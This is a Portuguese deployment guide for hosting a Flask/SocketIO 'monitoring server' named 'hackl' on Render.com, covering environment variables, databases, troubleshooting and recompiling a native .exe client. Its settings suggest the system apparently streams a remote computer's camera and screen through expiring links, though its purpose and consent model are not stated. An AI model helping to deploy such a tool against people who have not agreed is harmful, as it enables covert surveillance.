# 🚀 Guia de Deploy no Render.com

## 📋 Pré-requisitos

- Conta no [Render.com](https://render.com)
- Repositório GitHub com o código
- Todas as melhorias das Semanas 1-3 implementadas

---

## 🔧 Configuração do Render

### 1. Criar Web Service

1. Acesse [Render Dashboard](https://dashboard.render.com)
2. Clique em **"New +"** → **"Web Service"**
3. Conecte seu repositório GitHub
4. Configure:
   - **Name**: `hackl` (ou seu nome preferido)
   - **Environment**: `Python 3`
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `python app.py`

---

## ⚙️ Variáveis de Ambiente no Render

**IMPORTANTE**: Configure estas variáveis em **Environment** no painel do Render:

### Obrigatórias:
```bash
SECRET_KEY=<gere uma chave segura>
SERVER_URL=https://hackl.onrender.com
PORT=10000
FLASK_ENV=production
```

### Opcionais (com valores padrão):
```bash
DATABASE_URL=sqlite:///dashboard.db
MAX_LINK_EXPIRY_MINUTES=1440
RATE_LIMIT_LINKS=5 per minute
RATE_LIMIT_ACCESS=10 per minute
CAMERA_FPS=6
SCREEN_FPS=2
JPEG_QUALITY_CAMERA=25
JPEG_QUALITY_SCREEN=20
```

### Como gerar SECRET_KEY segura:
```bash
python -c "import secrets; print(secrets.token_hex(32))"
```

---

## 📦 Arquivos Necessários

### 1. `requirements.txt` (já existe)
```txt
flask
flask-socketio
flask-sqlalchemy
flask-limiter
python-dotenv
eventlet
cryptography
opencv-python
python-socketio[client]
requests
mss
numpy
```

### 2. `runtime.txt` (criar se não existir)
```txt
python-3.11.0
```

### 3. `.gitignore` (já existe)
Certifique-se que `.env` está ignorado:
```
.env
*.db
instance/
__pycache__/
```

---

## 🗄️ Banco de Dados no Render

### Opção 1: SQLite (Atual - Simples)
- ✅ Funciona out-of-the-box
- ⚠️ Dados são perdidos em cada redeploy
- 📝 Bom para testes

### Opção 2: PostgreSQL (Recomendado para Produção)

1. **Criar PostgreSQL Database** no Render:
   - New + → PostgreSQL
   - Copie a **Internal Database URL**

2. **Atualizar `requirements.txt`**:
   ```txt
   # Adicionar:
   psycopg2-binary
   ```

3. **Atualizar variável de ambiente**:
   ```bash
   DATABASE_URL=<sua_postgresql_url>
   ```

4. **Atualizar `config.py`** (opcional - já funciona):
   ```python
   # Já está configurado para usar DATABASE_URL do .env
   ```

---

## 🔄 Deploy Automático

### Configurar no GitHub:

1. **Push para `main`** = Deploy automático
2. Render detecta mudanças e faz redeploy

### Forçar Redeploy Manual:
- Render Dashboard → Seu serviço → **"Manual Deploy"** → **"Deploy latest commit"**

---

## 🌐 Acessar o Sistema

Após deploy bem-sucedido:

- **Dashboard**: `https://hackl.onrender.com/`
- **API**: `https://hackl.onrender.com/api/v1/stats`
- **Health Check**: `https://hackl.onrender.com/api/v1/health`

---

## 🐛 Troubleshooting no Render

### 1. Erro: "Application failed to respond"
**Causa**: App não está escutando na porta correta

**Solução**: Verificar `app.py`:
```python
if __name__ == '__main__':
    socketio.run(
        app, 
        debug=(Config.FLASK_ENV == 'development'), 
        port=Config.PORT,  # ✅ Usa PORT do .env
        host='0.0.0.0'     # ✅ Importante para Render
    )
```

### 2. Erro: "Module not found"
**Causa**: Dependência faltando

**Solução**: Adicionar ao `requirements.txt` e fazer redeploy

### 3. Banco de dados vazio após redeploy
**Causa**: SQLite não persiste no Render

**Solução**: 
- Usar PostgreSQL (recomendado)
- Ou aceitar que dados são temporários

### 4. SocketIO não conecta
**Causa**: Render pode ter limitações com WebSocket

**Solução**: Já configurado para fallback:
```python
socketio = SocketIO(app, cors_allowed_origins=Config.CORS_ALLOWED_ORIGINS)
# Cliente usa: transports=['websocket', 'polling']
```

### 5. Logs não aparecem
**Causa**: Render não persiste arquivos

**Solução**: Ver logs no painel do Render:
- Dashboard → Seu serviço → **"Logs"**

---

## 📊 Monitorar no Render

### Logs em Tempo Real:
```
Dashboard → hackl → Logs
```

Você verá:
```
🚀 Iniciando servidor de monitoramento...
✅ Configurações validadas com sucesso
✅ Rate limiter configurado
✅ Blueprint API registrado em /api/v1
```

### Métricas:
- CPU Usage
- Memory Usage
- Request Count
- Response Time

---

## 🔐 Segurança no Render

### 1. HTTPS Automático
✅ Render fornece HTTPS grátis para todos os serviços

### 2. Variáveis de Ambiente Seguras
✅ Nunca commite `.env` no GitHub
✅ Configure tudo no painel do Render

### 3. CORS
Atualizar no Render:
```bash
CORS_ALLOWED_ORIGINS=https://hackl.onrender.com
```

---

## 🚀 Checklist de Deploy

Antes de fazer deploy:

- [ ] `.env` está no `.gitignore`
- [ ] `SECRET_KEY` configurada no Render
- [ ] `SERVER_URL` aponta para `https://hackl.onrender.com`
- [ ] `PORT=10000` configurado
- [ ] `requirements.txt` atualizado
- [ ] Código commitado e pushed para GitHub
- [ ] Render conectado ao repositório
- [ ] Build command: `pip install -r requirements.txt`
- [ ] Start command: `python app.py`

---

## 📱 Cliente Nativo (.exe) com Render

### Atualizar `cliente_app/.env`:
```bash
SERVER_URL=https://hackl.onrender.com
LINK_CODE=NATIVE_CLIENT
```

### Recompilar:
```bash
cd cliente_app
python build_exe.py
```

O executável agora conectará ao Render automaticamente!

---

## 🔄 Workflow de Desenvolvimento

### Desenvolvimento Local:
```bash
# .env local
SERVER_URL=http://localhost:5000
FLASK_ENV=development
```

### Produção (Render):
```bash
# Variáveis no painel Render
SERVER_URL=https://hackl.onrender.com
FLASK_ENV=production
```

---

## 💡 Dicas Pro

### 1. Manter Render Ativo
Render free tier "dorme" após 15min de inatividade.

**Solução**: Usar serviço de ping:
- [UptimeRobot](https://uptimerobot.com)
- Ping `https://hackl.onrender.com/api/v1/health` a cada 10min

### 2. Migração de Dados
Se mudar de SQLite para PostgreSQL:

```bash
# Exportar dados atuais
python -c "from app import *; import json; print(json.dumps([l.to_dict() for l in Link.query.all()]))" > backup.json

# Importar no novo banco
# (criar script de migração)
```

### 3. Logs Persistentes
Para logs que não se perdem:

```python
# Usar serviço externo como:
# - Papertrail
# - Loggly
# - CloudWatch
```

---

## 🎯 URLs Importantes

| Serviço | URL |
|---------|-----|
| Dashboard | https://hackl.onrender.com/ |
| API Stats | https://hackl.onrender.com/api/v1/stats |
| API Health | https://hackl.onrender.com/api/v1/health |
| API Links | https://hackl.onrender.com/api/v1/links |
| Render Dashboard | https://dashboard.render.com |
| Logs | https://dashboard.render.com/web/[seu-id]/logs |

---

## 📞 Suporte

### Render Status:
https://status.render.com

### Documentação Render:
https://render.com/docs

### Logs de Erro:
Sempre verifique os logs no painel do Render primeiro!

---

**Última atualização**: 2026-01-08  
**Versão do Sistema**: 3.0 (Semanas 1-3 completas)
